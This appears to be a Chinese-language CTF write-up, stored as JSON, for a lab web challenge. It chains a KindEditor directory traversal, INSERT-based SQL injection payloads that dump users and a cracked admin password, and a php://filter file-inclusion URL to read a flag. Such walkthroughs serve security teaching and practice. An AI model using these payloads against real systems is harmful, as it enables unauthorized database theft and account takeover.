{"title":"i春秋-Web-BLOG","date":"2018-09-11T09:37:52.000Z","slug":"ichunqiu-web-BLOG","tags":["BLOG","Web","i春秋"],"updated":"2018-09-11T12:51:28.623Z","content":"<p>一个BLOG，注册后登录，发现使用了 <code>kindeditor 4.1.10</code> 编辑器，这个编辑器存在目录遍历漏洞，访问 <code>/kindeditor/php/file_manager_json.php?path=../</code>，会泄露目录内文件。</p>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-BLOG/kindeditor.png\" alt=\"kindeditor\"></p></div>\n<p>发现 <code>flag</code> 就在网站根目录下，但是没办法访问到。</p>\n<p>继续摸索，有个发文章的功能，存在SQL注入，INSERT型。</p>\n<p>通过INSERT可以批量添加记录的特性，判断出当前表存在4个字段。</p>\n<p>Payload:</p>\n<blockquote>\n<p>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’) # 报错<br>title=1&amp;content=1’,’1’),(‘aaa’,’bbb’,’ccc’,’ddd’) # 成功</p>\n</blockquote>\n<p>根据回显，得出第二个字段是标题，第三个字段是内容。</p>\n<p>开始爆数据：</p>\n<ul>\n<li><p>爆表名</p>\n<blockquote>\n<p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(table_name) from information_schema.tables where table_schema = database()),’ccc’,’ddd’) # 得到表 [posts,users]</p>\n</blockquote>\n</li>\n<li><p>爆字段</p>\n<blockquote>\n<p>title=1&amp;content=1’,’1’),(‘aaa’,(select table_name, column_name from information_schema.columns where table_name = ‘users’ # 得到两个字段 [username,password]</p>\n</blockquote>\n</li>\n<li><p>爆用户</p>\n<blockquote>\n<p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(username) from users ),’ccc’,’ddd’) # 得到用户名 admin </p>\n</blockquote>\n</li>\n<li><p>爆密码</p>\n<blockquote>\n<p>title=1&amp;content=1’,’1’),(‘aaa’,(select group_concat(password) from users ),’ccc’,’ddd’) # 得到密码HASH dbb616c5d935d8f34c12c291066d6fb7，解密后 melody123</p>\n</blockquote>\n</li>\n</ul>\n<p>重新以 <code>admin</code> 身份登录，发现新的入口 <code>/blog_manage/manager.php?module=article_manage&amp;name=php</code>，看链接，长得就像文件包含漏洞。</p>\n<p>测试后，发现确实是这个问题。</p>\n<p>构造链接， <code>/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code>，成功读到 <code>flag</code>。</p>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-BLOG/flag.png\" alt=\"flag\"></p></div>\n","prev":{"title":"文件上传绕过的各种姿势","slug":"summary-fileupload-bypass"},"next":{"title":"ichunqiu-web-Upload","slug":"ichunqiu-web-Upload"},"link":"http://Jayl1n.github.io/post/ichunqiu-web-BLOG/"}